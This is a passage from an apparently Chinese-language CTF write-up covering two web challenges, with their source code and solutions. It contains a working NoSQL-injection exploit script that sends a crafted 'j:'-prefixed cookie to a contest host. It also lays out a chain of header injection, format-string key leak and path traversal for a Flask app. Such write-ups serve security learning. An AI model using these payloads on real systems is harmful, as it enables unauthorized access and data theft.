+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">ok</span>: <span class="kt">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">sid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">username</span>: <span class="kt">user.username</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Error in /login:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;internal error&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s1">&#39;sid&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">ok</span>: <span class="kt">true</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="kr">get</span><span class="p">(</span><span class="s1">&#39;/me&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">loggedIn</span>: <span class="kt">false</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">loggedIn</span>: <span class="kt">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">username</span>: <span class="kt">req.user.username</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="kr">get</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="o">||</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">username</span> <span class="o">!==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;admin only&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">flag</span>: <span class="kt">FLAG</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/visit&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span>: <span class="kt">Request</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">url</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span> <span class="kr">as</span> <span class="p">{</span> <span class="nx">url?</span>: <span class="kt">unknown</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">url</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;url must be a string&#39;</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">await</span> <span class="nx">runXssVisit</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span> <span class="nx">ok</span>: <span class="kt">true</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span>: <span class="kt">any</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;XSS bot error:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span> <span class="nx">error</span><span class="o">:</span> <span class="s1">&#39;bot failed&#39;</span><span class="p">,</span> <span class="nx">detail</span>: <span class="kt">String</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">initMongo</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="nx">then</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server listening on port </span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="cl">  <span class="p">.</span><span class="k">catch</span><span class="p">((</span><span class="nx">err</span>: <span class="kt">unknown</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Failed to initialize MongoDB:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span></code></pre></div><p><code>cookie-parser</code>有个特性，如果传入的 Cookie 值以<code>j:</code>开头，它会自动将后面的内容作为 JSON 进行解析，并将其转换为 JavaScript 对象返回，<code>let adminUser = await usersCollection.findOne({ username: 'admin' });</code>一眼丁真 nosql 注入，下一步就是找传参的位置</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-typescript" data-lang="typescript"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">sessionMiddleware</span><span class="p">(</span><span class="nx">req</span>: <span class="kt">AuthedRequest</span><span class="p">,</span> <span class="nx">res</span>: <span class="kt">Response</span><span class="p">,</span> <span class="nx">next</span>: <span class="kt">NextFunction</span><span class="p">)</span><span class="o">:</span> <span class="nx">Promise</span><span class="p">&lt;</span><span class="nt">void</span><span class="p">&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// 这里的 as string 只是 TypeScript 的编译期类型断言，运行时无效
+</span></span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">sid</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="o">?</span><span class="p">.</span><span class="nx">sid</span> <span class="kr">as</span> <span class="kt">string</span> <span class="o">|</span> <span class="kc">undefined</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">  <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">sessionsCollection</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span> <span class="nx">sid</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>如果在请求中发送<code>Cookie: sid=j:{&quot;$ne&quot;: null}</code>，在运行时<code>req.cookies.sid</code>将不再是一个字符串，而是一个真实的 JavaScript 对象<code>{&quot;$ne&quot;: null}</code></p>
+<p>exp 如下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s2">&#34;http://223.6.249.127:10977&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/visit&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;url&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">/admin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;sid&#34;</span><span class="p">:</span> <span class="s1">&#39;j:{&#34;$ne&#34;: &#34;1&#34;}&#39;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">get_flag</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="cutter">cutter</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">httpx</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">API_KEY</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">HOST</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1:5000&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;Authorization&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">token</span> <span class="o">!=</span> <span class="n">API_KEY</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;unauth&#39;</span><span class="p">,</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">tmpl</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;tmpl&#39;</span><span class="p">,</span> <span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tmpl_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;./templates&#39;</span><span class="p">,</span> <span class="n">tmpl</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">tmpl_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Not Found&#39;</span><span class="p">,</span> <span class="mi">404</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">tmpl_content</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">tmpl_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">tmpl_content</span><span class="p">),</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/action&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">action</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">ip</span> <span class="o">!=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;only localhost&#39;</span><span class="p">,</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;X-Token&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">token</span> <span class="o">!=</span> <span class="n">API_KEY</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;unauth&#39;</span><span class="p">,</span> <span class="mi">403</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;action&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">act</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">action</span><span class="o">.</span><span class="n">stream</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">act</span><span class="p">[</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;echo&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">content</span><span class="p">,</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">act</span><span class="p">[</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;debug&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">content</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">app</span><span class="p">),</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;unkown action&#39;</span><span class="p">,</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/heartbeat&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">heartbeat</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="s2">&#34;default&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;client&#39;</span><span class="p">,</span> <span class="s2">&#34;default&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">300</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;text too large&#34;</span><span class="p">,</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">action</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;type&#34;</span> <span class="p">:</span> <span class="s2">&#34;echo&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">form_data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span> <span class="n">BytesIO</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">encode</span><span class="p">()),</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;action&#39;</span> <span class="p">:</span> <span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span> <span class="n">BytesIO</span><span class="p">(</span><span class="n">action</span><span class="o">.</span><span class="n">encode</span><span class="p">()),</span> <span class="s1">&#39;text/json&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;X-Token&#34;</span> <span class="p">:</span> <span class="n">API_KEY</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span><span class="p">[</span><span class="n">client</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">httpx</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">HOST</span><span class="si">}</span><span class="s2">/action&#34;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">form_data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">10.0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="sa">f</span><span class="s1">&#39;action failed&#39;</span><span class="p">,</span> <span class="mi">500</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></div><p><code>/heartbeat</code>伪造 multipart → 打到本地<code>/action</code>的<code>debug</code>分支 → 泄露<code>API_KEY</code> → 带 key 打<code>/admin</code> → 路径穿越任意文件读，但是由于 flag 的位置不在<code>/flag</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> -n <span class="s2">&#34;</span><span class="nv">$FLAG</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$FLAG</span><span class="s2">&#34;</span> &gt; <span class="s2">&#34;/flag-</span><span class="k">$(</span>cat /dev/urandom <span class="p">|</span> tr -dc <span class="s1">&#39;a-f0-9&#39;</span> <span class="p">|</span> head -c 32<span class="k">)</span><span class="s2">.txt&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">unset</span> FLAG
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;flag{testflag}&#34;</span> &gt; <span class="s2">&#34;/flag-</span><span class="k">$(</span>cat /dev/urandom <span class="p">|</span> tr -dc <span class="s1">&#39;a-f0-9&#39;</span> <span class="p">|</span> head -c 32<span class="k">)</span><span class="s2">.txt&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">useradd -M ctf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">su ctf -c <span class="s1">&#39;cd /app &amp;&amp; python app.py&#39;</span>
